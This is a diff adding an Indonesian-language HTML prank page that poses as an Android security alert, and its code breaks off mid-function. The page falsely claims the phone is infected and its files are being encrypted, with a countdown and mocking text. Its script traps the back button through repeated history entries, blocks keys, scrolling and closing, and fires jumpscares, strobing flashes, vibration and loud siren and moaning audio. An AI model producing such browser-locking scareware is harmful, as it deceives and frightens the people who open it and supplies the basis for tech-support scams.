@@ -1,0 +1,1552 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>Android System Alert</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            user-select: none;
+            -webkit-user-select: none;
+            -webkit-touch-callout: none;
+        }
+
+        @keyframes shake {
+            0% { transform: translate(0,0) rotate(0deg); }
+            5% { transform: translate(-8px,-6px) rotate(-2deg); }
+            10% { transform: translate(8px,4px) rotate(2deg); }
+            15% { transform: translate(-6px,8px) rotate(-1.5deg); }
+            20% { transform: translate(6px,-8px) rotate(1.5deg); }
+            25% { transform: translate(-8px,3px) rotate(-2deg); }
+            30% { transform: translate(8px,-3px) rotate(2deg); }
+            35% { transform: translate(-4px,-7px) rotate(-1deg); }
+            40% { transform: translate(4px,7px) rotate(1deg); }
+            45% { transform: translate(-6px,-4px) rotate(-2deg); }
+            50% { transform: translate(6px,4px) rotate(2deg); }
+            55% { transform: translate(-8px,6px) rotate(-1.5deg); }
+            60% { transform: translate(8px,-6px) rotate(1.5deg); }
+            65% { transform: translate(-4px,-8px) rotate(-2deg); }
+            70% { transform: translate(4px,8px) rotate(2deg); }
+            75% { transform: translate(-8px,-3px) rotate(-1deg); }
+            80% { transform: translate(8px,3px) rotate(1deg); }
+            85% { transform: translate(-6px,7px) rotate(-2deg); }
+            90% { transform: translate(6px,-7px) rotate(2deg); }
+            95% { transform: translate(-4px,4px) rotate(-1deg); }
+            100% { transform: translate(0,0) rotate(0deg); }
+        }
+
+        @keyframes shakeHard {
+            0% { transform: translate(0,0) rotate(0deg) scale(1); }
+            10% { transform: translate(-15px,-12px) rotate(-5deg) scale(1.02); }
+            20% { transform: translate(15px,10px) rotate(5deg) scale(0.98); }
+            30% { transform: translate(-12px,15px) rotate(-4deg) scale(1.03); }
+            40% { transform: translate(12px,-15px) rotate(4deg) scale(0.97); }
+            50% { transform: translate(-15px,8px) rotate(-5deg) scale(1.02); }
+            60% { transform: translate(15px,-8px) rotate(5deg) scale(0.98); }
+            70% { transform: translate(-8px,-15px) rotate(-3deg) scale(1.01); }
+            80% { transform: translate(8px,15px) rotate(3deg) scale(0.99); }
+            90% { transform: translate(-12px,-10px) rotate(-4deg) scale(1.02); }
+            100% { transform: translate(0,0) rotate(0deg) scale(1); }
+        }
+
+        @keyframes scanlineMove {
+            0% { transform: translateY(0); }
+            100% { transform: translateY(4px); }
+        }
+
+        @keyframes glitchText {
+            0% { transform: skewX(0deg); opacity: 1; }
+            10% { transform: skewX(-8deg); opacity: 0.8; }
+            20% { transform: skewX(6deg); clip-path: inset(20% 0 30% 0); }
+            30% { transform: skewX(-4deg); clip-path: none; opacity: 1; }
+            40% { transform: skewX(8deg); }
+            50% { transform: skewX(-3deg); opacity: 0.9; }
+            60% { transform: skewX(5deg); clip-path: inset(50% 0 10% 0); }
+            70% { transform: skewX(-6deg); clip-path: none; }
+            80% { transform: skewX(4deg); opacity: 0.85; }
+            90% { transform: skewX(-2deg); }
+            100% { transform: skewX(0deg); opacity: 1; }
+        }
+
+        @keyframes glitchBefore {
+            0% { transform: translate(0); }
+            20% { transform: translate(-4px, 4px); }
+            40% { transform: translate(4px, -4px); }
+            60% { transform: translate(-3px, 3px); }
+            80% { transform: translate(3px, -3px); }
+            100% { transform: translate(0); }
+        }
+
+        @keyframes glitchAfter {
+            0% { transform: translate(0); }
+            20% { transform: translate(4px, -4px); }
+            40% { transform: translate(-4px, 4px); }
+            60% { transform: translate(3px, -3px); }
+            80% { transform: translate(-3px, 3px); }
+            100% { transform: translate(0); }
+        }
+
+        @keyframes pulseRed {
+            0% { opacity: 0.6; text-shadow: 0 0 10px #ff0000, 0 0 20px #ff0000; }
+            100% { opacity: 1; text-shadow: 0 0 20px #ff0000, 0 0 40px #ff0000, 0 0 80px #ff0000, 0 0 120px #ff0000; }
+        }
+
+        @keyframes skullPulse {
+            0% { transform: scale(1); }
+            100% { transform: scale(1.3); }
+        }
+
+        @keyframes skullSpin {
+            0% { filter: drop-shadow(0 0 30px #ff0000) hue-rotate(0deg); }
+            50% { filter: drop-shadow(0 0 60px #ff0000) hue-rotate(180deg); }
+            100% { filter: drop-shadow(0 0 30px #ff0000) hue-rotate(360deg); }
+        }
+
+        @keyframes blinkNexus {
+            0%, 100% { opacity: 1; border-color: #00ff00; background: rgba(0,255,0,0.1); }
+            50% { opacity: 0.6; border-color: #ff0000; background: rgba(255,0,0,0.1); }
+        }
+
+        @keyframes warningScroll {
+            0% { background-position: 0 0; }
+            100% { background-position: 56px 0; }
+        }
+
+        @keyframes popupAppear {
+            0% { transform: scale(0) rotate(180deg); opacity: 0; }
+            60% { transform: scale(1.2) rotate(-10deg); opacity: 1; }
+            100% { transform: scale(1) rotate(0deg); opacity: 1; }
+        }
+
+        @keyframes scareShake {
+            0% { transform: translate(0,0) scale(1) rotate(0deg); }
+            12% { transform: translate(-20px,15px) scale(1.2) rotate(-8deg); }
+            25% { transform: translate(20px,-15px) scale(0.8) rotate(8deg); }
+            37% { transform: translate(-15px,-20px) scale(1.3) rotate(-5deg); }
+            50% { transform: translate(15px,20px) scale(0.7) rotate(5deg); }
+            62% { transform: translate(-20px,10px) scale(1.2) rotate(-10deg); }
+            75% { transform: translate(20px,-10px) scale(0.9) rotate(10deg); }
+            87% { transform: translate(-10px,-15px) scale(1.1) rotate(-3deg); }
+            100% { transform: translate(10px,15px) scale(1) rotate(3deg); }
+        }
+
+        @keyframes scareFlash {
+            0% { opacity: 1; filter: brightness(1); }
+            25% { opacity: 0.2; filter: brightness(3) invert(1); }
+            50% { opacity: 1; filter: brightness(1); }
+            75% { opacity: 0.3; filter: brightness(2) hue-rotate(180deg); }
+            100% { opacity: 1; filter: brightness(1); }
+        }
+
+        @keyframes flyError {
+            0% { transform: translateY(0) rotate(0deg) scale(1); opacity: 1; }
+            50% { opacity: 0.8; }
+            100% { transform: translateY(-120vh) rotate(1080deg) scale(0.3); opacity: 0; }
+        }
+
+        @keyframes flashBang {
+            0% { background: rgba(255,0,0,0.9); }
+            15% { background: rgba(255,255,255,1); }
+            30% { background: rgba(0,255,0,0.6); }
+            45% { background: rgba(0,0,0,0.8); }
+            60% { background: rgba(255,0,0,0.7); }
+            75% { background: rgba(255,255,255,0.5); }
+            100% { background: transparent; }
+        }
+
+        @keyframes blinkFast {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.2; }
+        }
+
+        @keyframes barFill {
+            0% { width: 5%; }
+            15% { width: 22%; }
+            30% { width: 38%; }
+            45% { width: 51%; }
+            55% { width: 63%; }
+            70% { width: 78%; }
+            80% { width: 85%; }
+            90% { width: 93%; }
+            95% { width: 97%; }
+            100% { width: 99.9%; }
+        }
+
+        @keyframes barShimmer {
+            0% { background-position: 0% 0; }
+            100% { background-position: 200% 0; }
+        }
+
+        @keyframes rgbBorder {
+            0% { border-color: #ff0000; box-shadow: 0 0 30px #ff0000; }
+            33% { border-color: #00ff00; box-shadow: 0 0 30px #00ff00; }
+            66% { border-color: #0000ff; box-shadow: 0 0 30px #0000ff; }
+            100% { border-color: #ff0000; box-shadow: 0 0 30px #ff0000; }
+        }
+
+        @keyframes typewriter {
+            from { width: 0; }
+            to { width: 100%; }
+        }
+
+        @keyframes blink-caret {
+            from, to { border-color: transparent; }
+            50% { border-color: #00ff00; }
+        }
+
+        @keyframes rotateSkull {
+            0% { transform: rotateY(0deg); }
+            100% { transform: rotateY(360deg); }
+        }
+
+        @keyframes glitchScreen {
+            0% { clip-path: inset(0 0 0 0); }
+            5% { clip-path: inset(20% 0 40% 0); filter: hue-rotate(90deg); }
+            10% { clip-path: inset(60% 0 10% 0); filter: hue-rotate(180deg); }
+            15% { clip-path: inset(0 0 0 0); filter: none; }
+            20% { clip-path: inset(40% 0 20% 0); filter: saturate(5); }
+            25% { clip-path: inset(0 0 0 0); filter: none; }
+            100% { clip-path: inset(0 0 0 0); filter: none; }
+        }
+
+        @keyframes countdown {
+            0% { color: #ffff00; }
+            50% { color: #ff0000; transform: scale(1.1); }
+            100% { color: #ffff00; transform: scale(1); }
+        }
+
+        body {
+            background: #000;
+            overflow: hidden;
+            width: 100vw;
+            height: 100vh;
+            font-family: 'Courier New', monospace;
+            cursor: none;
+        }
+
+        #matrixCanvas {
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            z-index: 0;
+        }
+
+        .scanline {
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            background: repeating-linear-gradient(
+                0deg, transparent, transparent 2px,
+                rgba(0,255,0,0.03) 2px, rgba(0,255,0,0.03) 4px
+            );
+            z-index: 10;
+            pointer-events: none;
+            animation: scanlineMove 0.08s linear infinite;
+        }
+
+        .glitch-screen {
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            z-index: 11;
+            pointer-events: none;
+            animation: glitchScreen 3s infinite;
+        }
+
+        .main-container {
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            z-index: 5;
+            animation: shake 0.12s infinite;
+        }
+
+        .android-header {
+            background: rgba(255,0,0,0.15);
+            border: 1px solid #ff0000;
+            border-radius: 8px;
+            padding: 8px 20px;
+            margin-bottom: 15px;
+            animation: blinkFast 0.6s infinite;
+        }
+
+        .android-header span {
+            color: #ff4444;
+            font-size: clamp(0.6rem, 2.5vw, 0.9rem);
+            letter-spacing: 2px;
+            text-transform: uppercase;
+        }
+
+        .threat-level {
+            background: #ff0000;
+            color: #fff;
+            padding: 5px 25px;
+            border-radius: 20px;
+            font-size: clamp(0.7rem, 2.5vw, 1rem);
+            font-weight: bold;
+            margin-bottom: 10px;
+            animation: blinkFast 0.4s infinite;
+            letter-spacing: 3px;
+        }
+
+        .skull {
+            font-size: clamp(4rem, 18vw, 12rem);
+            animation: skullPulse 0.4s infinite alternate, skullSpin 1.5s infinite;
+            filter: drop-shadow(0 0 40px #ff0000);
+            margin: 10px 0;
+        }
+
+        .virus-title {
+            font-size: clamp(1.8rem, 7vw, 4.5rem);
+            font-weight: 900;
+            color: #ff0000;
+            text-align: center;
+            text-transform: uppercase;
+            text-shadow: 0 0 10px #ff0000, 0 0 20px #ff0000,
+                         0 0 40px #ff0000, 0 0 80px #ff0000, 0 0 120px #ff0000;
+            animation: glitchText 0.25s infinite, pulseRed 0.4s infinite alternate;
+            position: relative;
+            padding: 0 15px;
+            letter-spacing: 4px;
+        }
+
+        .virus-title::before,
+        .virus-title::after {
+            content: attr(data-text);
+            position: absolute;
+            top: 0; left: 15px;
+            width: 100%; height: 100%;
+        }
+
+        .virus-title::before {
+            color: #0ff;
+            animation: glitchBefore 0.15s infinite;
+            clip-path: polygon(0 0, 100% 0, 100% 45%, 0 45%);
+        }
+
+        .virus-title::after {
+            color: #f0f;
+            animation: glitchAfter 0.2s infinite;
+            clip-path: polygon(0 55%, 100% 55%, 100% 100%, 0 100%);
+        }
+
+        .virus-subtitle {
+            color: #ff6666;
+            font-size: clamp(0.7rem, 3vw, 1.2rem);
+            text-align: center;
+            margin-top: 8px;
+            animation: blinkFast 0.5s infinite;
+            padding: 0 20px;
+        }
+
+        .device-info {
+            background: rgba(255,0,0,0.1);
+            border: 1px solid rgba(255,0,0,0.5);
+            border-radius: 5px;
+            padding: 10px 15px;
+            margin: 12px 15px;
+            max-width: 90%;
+            animation: rgbBorder 2s infinite;
+        }
+
+        .device-info p {
+            color: #ff8888;
+            font-size: clamp(0.55rem, 2vw, 0.8rem);
+            margin: 3px 0;
+            text-align: left;
+        }
+
+        .device-info p span.val {
+            color: #ff0000;
+            font-weight: bold;
+        }
+
+        .nexus-msg {
+            font-size: clamp(0.9rem, 3.5vw, 1.8rem);
+            color: #00ff00;
+            text-align: center;
+            margin-top: 15px;
+            padding: 12px 25px;
+            border: 2px solid #00ff00;
+            background: rgba(0,255,0,0.08);
+            border-radius: 8px;
+            text-shadow: 0 0 5px #00ff00, 0 0 10px #00ff00, 0 0 20px #00ff00;
+            animation: blinkNexus 0.7s infinite;
+            max-width: 92%;
+        }
+
+        .countdown-timer {
+            color: #ffff00;
+            font-size: clamp(1.5rem, 6vw, 3rem);
+            font-weight: 900;
+            margin-top: 10px;
+            text-shadow: 0 0 15px #ffff00, 0 0 30px #ff0000;
+            animation: countdown 1s infinite;
+        }
+
+        .warning-bar {
+            position: fixed;
+            width: 100%;
+            padding: 12px;
+            background: repeating-linear-gradient(
+                45deg, #ff0000, #ff0000 20px, #000 20px, #000 40px
+            );
+            z-index: 6;
+            animation: warningScroll 0.4s linear infinite;
+        }
+
+        .warning-bar.top { top: 0; }
+        .warning-bar.bottom { bottom: 0; }
+
+        .warning-bar .warning-text {
+            background: #000;
+            color: #ff0000;
+            text-align: center;
+            padding: 3px;
+            font-size: clamp(0.6rem, 2vw, 0.85rem);
+            font-weight: bold;
+            letter-spacing: 3px;
+            animation: blinkFast 0.3s infinite;
+            text-transform: uppercase;
+            overflow: hidden;
+            white-space: nowrap;
+        }
+
+        .fake-popup {
+            position: fixed;
+            background: #0d0d1a;
+            border: 2px solid #ff0000;
+            border-radius: 10px;
+            padding: 0;
+            z-index: 20;
+            min-width: 220px;
+            max-width: 300px;
+            box-shadow: 0 0 40px rgba(255,0,0,0.6), inset 0 0 20px rgba(255,0,0,0.1);
+            animation: popupAppear 0.4s ease;
+            overflow: hidden;
+        }
+
+        .fake-popup .popup-header {
+            background: linear-gradient(90deg, #cc0000, #ff0000, #cc0000);
+            color: white;
+            padding: 8px 12px;
+            font-weight: bold;
+            font-size: 0.8rem;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .fake-popup .popup-body {
+            color: #ff6666;
+            font-size: 0.75rem;
+            line-height: 1.5;
+            padding: 12px;
+        }
+
+        .fake-popup .popup-x {
+            cursor: pointer;
+            font-weight: bold;
+            background: rgba(0,0,0,0.3);
+            border-radius: 50%;
+            width: 20px;
+            height: 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 0.7rem;
+        }
+
+        .fake-popup .popup-btn {
+            display: block;
+            width: calc(100% - 24px);
+            margin: 0 12px 12px;
+            padding: 8px;
+            background: #ff0000;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            font-weight: bold;
+            font-size: 0.75rem;
+            cursor: pointer;
+            animation: blinkFast 0.8s infinite;
+        }
+
+        #jumpscare {
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            z-index: 100;
+            display: none;
+            justify-content: center;
+            align-items: center;
+            background: #000;
+        }
+
+        #jumpscare .scare-face {
+            font-size: clamp(12rem, 60vw, 35rem);
+            animation: scareShake 0.06s infinite, scareFlash 0.1s infinite;
+            filter: drop-shadow(0 0 80px #ff0000);
+        }
+
+        .flying-error {
+            position: fixed;
+            color: #ff0000;
+            font-size: 1.5rem;
+            font-weight: bold;
+            z-index: 15;
+            pointer-events: none;
+            text-shadow: 0 0 15px #ff0000;
+            animation: flyError 2.5s linear forwards;
+            white-space: nowrap;
+        }
+
+        .flash {
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            z-index: 50;
+            pointer-events: none;
+            animation: flashBang 0.4s ease;
+        }
+
+        .fake-progress {
+            position: fixed;
+            bottom: 55px;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 85%;
+            max-width: 420px;
+            z-index: 7;
+        }
+
+        .fake-progress .label {
+            color: #ff0000;
+            font-size: clamp(0.55rem, 2vw, 0.8rem);
+            margin-bottom: 5px;
+            text-shadow: 0 0 5px #ff0000;
+            animation: blinkFast 0.3s infinite;
+        }
+
+        .fake-progress .bar-bg {
+            background: #1a1a1a;
+            border: 2px solid #ff0000;
+            border-radius: 4px;
+            height: 18px;
+            overflow: hidden;
+            box-shadow: 0 0 10px rgba(255,0,0,0.3);
+        }
+
+        .fake-progress .bar-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #ff0000, #ff6600, #ff0000, #cc0000);
+            background-size: 200% 100%;
+            animation: barFill 8s ease-in-out infinite, barShimmer 0.3s linear infinite;
+            width: 0%;
+            position: relative;
+        }
+
+        .fake-progress .percent {
+            color: #ffff00;
+            font-size: 0.7rem;
+            text-align: right;
+            margin-top: 3px;
+            font-weight: bold;
+            text-shadow: 0 0 5px #ffff00;
+        }
+
+        .hex-code {
+            position: fixed;
+            color: rgba(255,0,0,0.25);
+            font-size: 0.6rem;
+            z-index: 2;
+            pointer-events: none;
+            font-family: 'Courier New', monospace;
+            white-space: nowrap;
+        }
+
+        .terminal-line {
+            position: fixed;
+            bottom: 100px;
+            left: 10px;
+            right: 10px;
+            z-index: 8;
+            color: #00ff00;
+            font-size: clamp(0.5rem, 1.8vw, 0.7rem);
+            text-shadow: 0 0 5px #00ff00;
+            opacity: 0.7;
+            overflow: hidden;
+            white-space: nowrap;
+        }
+
+        #blocker {
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            z-index: 999;
+            background: transparent;
+        }
+
+        .red-vignette {
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            background: radial-gradient(ellipse at center, transparent 40%, rgba(255,0,0,0.3) 100%);
+            z-index: 4;
+            pointer-events: none;
+            animation: pulseRed 1s infinite alternate;
+        }
+
+        .corner-skull {
+            position: fixed;
+            font-size: 3rem;
+            z-index: 6;
+            animation: skullPulse 0.6s infinite alternate;
+            filter: drop-shadow(0 0 15px #ff0000);
+            opacity: 0.7;
+        }
+        .corner-skull.tl { top: 40px; left: 10px; }
+        .corner-skull.tr { top: 40px; right: 10px; }
+        .corner-skull.bl { bottom: 40px; left: 10px; }
+        .corner-skull.br { bottom: 40px; right: 10px; }
+
+        .file-list {
+            color: #ff4444;
+            font-size: clamp(0.5rem, 1.5vw, 0.65rem);
+            text-align: left;
+            max-width: 90%;
+            margin-top: 8px;
+            opacity: 0.8;
+        }
+
+        .file-list div {
+            animation: blinkFast 0.5s infinite;
+            margin: 2px 0;
+        }
+
+        .sound-indicator {
+            position: fixed;
+            top: 45px;
+            right: 15px;
+            color: #ff0000;
+            font-size: 0.7rem;
+            z-index: 8;
+            animation: blinkFast 0.3s infinite;
+        }
+    </style>
+</head>
+<body>
+
+    <canvas id="matrixCanvas"></canvas>
+    <div class="scanline"></div>
+    <div class="glitch-screen"></div>
+    <div class="red-vignette"></div>
+
+    <!-- Corner Skulls -->
+    <div class="corner-skull tl">☠️</div>
+    <div class="corner-skull tr">💀</div>
+    <div class="corner-skull bl">👾</div>
+    <div class="corner-skull br">☠️</div>
+
+    <!-- Sound Indicator -->
+    <div class="sound-indicator">🔊 AUDIO ACTIVE</div>
+
+    <!-- Warning Bars -->
+    <div class="warning-bar top">
+        <div class="warning-text">⚠️ CRITICAL SYSTEM ALERT — DEVICE COMPROMISED — DO NOT TURN OFF ⚠️</div>
+    </div>
+    <div class="warning-bar bottom">
+        <div class="warning-text">☠️ NEXUS MALWARE v6.66 ACTIVE — ALL DATA BEING ENCRYPTED ☠️</div>
+    </div>
+
+    <!-- Main Content -->
+    <div class="main-container" id="mainContent">
+        <div class="android-header">
+            <span>🛡️ Android Security — THREAT DETECTED</span>
+        </div>
+
+        <div class="threat-level">🔴 THREAT LEVEL: CRITICAL</div>
+
+        <div class="skull" id="mainSkull">💀</div>
+
+        <div class="virus-title" data-text="HP ANDA TERKENA VIRUS!">HP ANDA TERKENA VIRUS!</div>
+
+        <div class="virus-subtitle" id="virusSub">
+            ⚠️ Ditemukan 47 malware aktif di perangkat Anda
+        </div>
+
+        <div class="device-info" id="deviceInfo">
+            <p>📱 Device: <span class="val" id="devName">Detecting...</span></p>
+            <p>🌐 IP Address: <span class="val" id="devIP">Tracing...</span></p>
+            <p>📍 Lokasi: <span class="val" id="devLoc">Triangulating...</span></p>
+            <p>🔋 Battery: <span class="val" id="devBatt">Draining...</span></p>
+            <p>🦠 Virus Found: <span class="val">47 threats</span></p>
+            <p>📂 Files Encrypted: <span class="val" id="filesEnc">0 / 12,847</span></p>
+        </div>
+
+        <div class="file-list" id="fileList">
+            <div>🔒 Encrypting: /DCIM/Camera/IMG_2024*.jpg</div>
+            <div>🔒 Encrypting: /WhatsApp/Media/...</div>
+            <div>🔒 Encrypting: /Documents/...</div>
+        </div>
+
+        <div class="nexus-msg" id="nexusMsg">
+            📝 Catatan Nexus: Wok kena virus kan 🤣🤣🤣
+        </div>
+
+        <div class="countdown-timer" id="countdown">
+            ⏱️ SELF-DESTRUCT: 05:00
+        </div>
+
+        <div class="fake-progress">
+            <div class="label">⚠️ ENCRYPTING ALL DATA... DO NOT POWER OFF</div>
+            <div class="bar-bg">
+                <div class="bar-fill" id="progressBar"></div>
+            </div>
+            <div class="percent" id="percentText">0.0%</div>
+        </div>
+    </div>
+
+    <!-- Terminal Line -->
+    <div class="terminal-line" id="terminalLine">
+        root@nexus:~# ./encrypt_all_data.sh --force --no-backup
+    </div>
+
+    <!-- Jumpscare Layer -->
+    <div id="jumpscare">
+        <div class="scare-face">👹</div>
+    </div>
+
+    <!-- Blocker -->
+    <div id="blocker"></div>
+
+    <script>
+        // ============================================================
+        // PREVENT CLOSE / BACK
+        // ============================================================
+        (function(){
+            for(let i=0;i<100;i++) history.pushState({p:i},'','');
+        })();
+
+        window.addEventListener('popstate', function(e){
+            history.pushState({},'','');
+            triggerJumpscare();
+            playScreamSound();
+        });
+
+        window.onbeforeunload = function(e){
+            e.preventDefault();
+            e.returnValue = '⚠️ VIRUS AKTIF! TIDAK BISA KELUAR! DATA ANDA AKAN HILANG!';
+            return e.returnValue;
+        };
+
+        document.addEventListener('keydown', function(e){
+            e.preventDefault(); e.stopPropagation();
+            triggerJumpscare();
+            return false;
+        }, true);
+
+        document.addEventListener('contextmenu', function(e){ e.preventDefault(); });
+
+        document.body.addEventListener('touchmove', function(e){ e.preventDefault(); }, {passive:false});
+        document.body.addEventListener('scroll', function(e){ e.preventDefault(); window.scrollTo(0,0); });
+
+        // Click/touch on blocker
+        let touchCount = 0;
+        document.getElementById('blocker').addEventListener('touchstart', handleInteraction);
+        document.getElementById('blocker').addEventListener('click', handleInteraction);
+
+        function handleInteraction(e){
+            touchCount++;
+            spawnPopup();
+            spawnFlyingError();
+            flashScreen();
+            playGlitchSound();
+
+            // Every 5 touches = jumpscare
+            if(touchCount % 5 === 0) triggerJumpscare();
+
+            // Vibrate on touch
+            vibratePhone();
+        }
+
+        // ============================================================
+        // ADVANCED AUDIO SYSTEM
+        // ============================================================
+        let audioCtx;
+        let audioStarted = false;
+        let sirenNode = null;
+        let moanInterval = null;
+
+        function initAudio(){
+            if(audioStarted) return;
+            audioStarted = true;
+            audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+
+            playSiren();
+            startMoanLoop();
+            startHeartbeat();
+
+            // Random glitch sounds
+            setInterval(playGlitchSound, 1500);
+
+            // Random deep horror drone
+            playHorrorDrone();
+        }
+
+        // --- SIREN ---
+        function playSiren(){
+            if(!audioCtx) return;
+            const osc = audioCtx.createOscillator();
+            const gain = audioCtx.createGain();
+            osc.connect(gain);
+            gain.connect(audioCtx.destination);
+            osc.type = 'sawtooth';
+            gain.gain.value = 0.15;
+
+            const now = audioCtx.currentTime;
+            for(let i=0; i<500; i++){
+                osc.frequency.setValueAtTime(300, now + i*0.6);
+                osc.frequency.linearRampToValueAtTime(1000, now + i*0.6 + 0.3);
+                osc.frequency.linearRampToValueAtTime(300, now + i*0.6 + 0.6);
+            }
+            osc.start(now);
+            osc.stop(now + 300);
+        }
+
+        // --- MOAN / AH-AH SOUND ---
+        function startMoanLoop(){
+            if(!audioCtx) return;
+
+            function playMoan(){
+                const osc1 = audioCtx.createOscillator();
+                const osc2 = audioCtx.createOscillator();
+                const osc3 = audioCtx.createOscillator();
+                const gainNode = audioCtx.createGain();
+                const filter = audioCtx.createBiquadFilter();
+
+                filter.type = 'bandpass';
+                filter.frequency.value = 800;
+                filter.Q.value = 2;
+
+                osc1.connect(filter);
+                osc2.connect(filter);
+                osc3.connect(filter);
+                filter.connect(gainNode);
+                gainNode.connect(audioCtx.destination);
+
+                const now = audioCtx.currentTime;
+
+                // "Ah" sound simulation using formants
+                osc1.type = 'sawtooth';
+                osc2.type = 'triangle';
+                osc3.type = 'sine';
+
+                // Voice-like frequency modulation
+                // First "Ah"
+                osc1.frequency.setValueAtTime(150, now);
+                osc1.frequency.linearRampToValueAtTime(300, now + 0.1);
+                osc1.frequency.linearRampToValueAtTime(250, now + 0.3);
+                osc1.frequency.linearRampToValueAtTime(100, now + 0.5);
+
+                // Second "Ah"
+                osc1.frequency.setValueAtTime(150, now + 0.6);
+                osc1.frequency.linearRampToValueAtTime(350, now + 0.7);
+                osc1.frequency.linearRampToValueAtTime(280, now + 0.9);
+                osc1.frequency.linearRampToValueAtTime(100, now + 1.1);
+
+                osc2.frequency.setValueAtTime(300, now);
+                osc2.frequency.linearRampToValueAtTime(600, now + 0.15);
+                osc2.frequency.linearRampToValueAtTime(500, now + 0.3);
+                osc2.frequency.setValueAtTime(300, now + 0.6);
+                osc2.frequency.linearRampToValueAtTime(650, now + 0.75);
+                osc2.frequency.linearRampToValueAtTime(500, now + 0.9);
+
+                osc3.frequency.setValueAtTime(700, now);
+                osc3.frequency.linearRampToValueAtTime(1100, now + 0.1);
+                osc3.frequency.setValueAtTime(700, now + 0.6);
+                osc3.frequency.linearRampToValueAtTime(1200, now + 0.7);
+
+                // Volume envelope - loud
+                gainNode.gain.setValueAtTime(0, now);
+                gainNode.gain.linearRampToValueAtTime(0.7, now + 0.05);
+                gainNode.gain.linearRampToValueAtTime(0.5, now + 0.3);
+                gainNode.gain.linearRampToValueAtTime(0, now + 0.5);
+                gainNode.gain.setValueAtTime(0, now + 0.6);
+                gainNode.gain.linearRampToValueAtTime(0.8, now + 0.65);
+                gainNode.gain.linearRampToValueAtTime(0.5, now + 0.9);
+                gainNode.gain.linearRampToValueAtTime(0, now + 1.1);
+
+                // Filter sweep for more realistic voice
+                filter.frequency.setValueAtTime(600, now);
+                filter.frequency.linearRampToValueAtTime(1200, now + 0.1);
+                filter.frequency.linearRampToValueAtTime(800, now + 0.3);
+                filter.frequency.setValueAtTime(600, now + 0.6);
+                filter.frequency.linearRampToValueAtTime(1300, now + 0.7);
+                filter.frequency.linearRampToValueAtTime(800, now + 0.9);
+
+                osc1.start(now);
+                osc2.start(now);
+                osc3.start(now);
+                osc1.stop(now + 1.2);
+                osc2.stop(now + 1.2);
+                osc3.stop(now + 1.2);
+
+                // Add breathy noise
+                const bufSize = audioCtx.sampleRate * 1.2;
+                const noiseBuf = audioCtx.createBuffer(1, bufSize, audioCtx.sampleRate);
+                const noiseData = noiseBuf.getChannelData(0);
+                for(let i=0; i<bufSize; i++){
+                    noiseData[i] = (Math.random()*2-1) * 0.3;
+                }
+                const noiseSource = audioCtx.createBufferSource();
+                const noiseGain = audioCtx.createGain();
+                const noiseFilter = audioCtx.createBiquadFilter();
+                noiseFilter.type = 'bandpass';
+                noiseFilter.frequency.value = 1000;
+                noiseFilter.Q.value = 1;
+
+                noiseSource.buffer = noiseBuf;
+                noiseSource.connect(noiseFilter);
+                noiseFilter.connect(noiseGain);
+                noiseGain.connect(audioCtx.destination);
+
+                noiseGain.gain.setValueAtTime(0, now);
+                noiseGain.gain.linearRampToValueAtTime(0.3, now + 0.05);
+                noiseGain.gain.linearRampToValueAtTime(0.1, now + 0.3);
+                noiseGain.gain.linearRampToValueAtTime(0, now + 0.5);
+                noiseGain.gain.setValueAtTime(0, now + 0.6);
+                noiseGain.gain.linearRampToValueAtTime(0.35, now + 0.65);
+                noiseGain.gain.linearRampToValueAtTime(0.1, now + 0.9);
+                noiseGain.gain.linearRampToValueAtTime(0, now + 1.1);
+
+                noiseSource.start(now);
+                noiseSource.stop(now + 1.2);
+            }
+
+            // Play moan every 2-4 seconds
+            playMoan();
+            moanInterval = setInterval(() => {
+                playMoan();
+            }, 2000 + Math.random() * 2000);
+        }
+
+        // --- HEARTBEAT ---
+        function startHeartbeat(){
+            if(!audioCtx) return;
+
+            function beat(){
+                const osc = audioCtx.createOscillator();
+                const gain = audioCtx.createGain();
+                osc.connect(gain);
+                gain.connect(audioCtx.destination);
+
+                osc.type = 'sine';
+                const now = audioCtx.currentTime;
+
+                // Thump 1
+                osc.frequency.setValueAtTime(60, now);
+                osc.frequency.exponentialRampToValueAtTime(30, now + 0.15);
+                gain.gain.setValueAtTime(0.6, now);
+                gain.gain.linearRampToValueAtTime(0, now + 0.15);
+
+                // Thump 2
+                osc.frequency.setValueAtTime(55, now + 0.2);
+                osc.frequency.exponentialRampToValueAtTime(25, now + 0.35);
+                gain.gain.setValueAtTime(0.5, now + 0.2);
+                gain.gain.linearRampToValueAtTime(0, now + 0.35);
+
+                osc.start(now);
+                osc.stop(now + 0.4);
+            }
+
+            setInterval(beat, 800);
+        }
+
+        // --- HORROR DRONE ---
+        function playHorrorDrone(){
+            if(!audioCtx) return;
+
+            const osc = audioCtx.createOscillator();
+            const osc2 = audioCtx.createOscillator();
+            const gain = audioCtx.createGain();
+
+            osc.connect(gain);
+            osc2.connect(gain);
+            gain.connect(audioCtx.destination);
+
+            osc.type = 'sawtooth';
+            osc2.type = 'sine';
+            osc.frequency.value = 55;
+            osc2.frequency.value = 57; // Slight detune for creepy beating
+
+            gain.gain.value = 0.08;
+
+            const now = audioCtx.currentTime;
+            // Slow modulation
+            osc.frequency.setValueAtTime(55, now);
+            osc.frequency.linearRampToValueAtTime(40, now + 10);
+            osc.frequency.linearRampToValueAtTime(60, now + 20);
+
+            osc.start(now);
+            osc2.start(now);
+            osc.stop(now + 300);
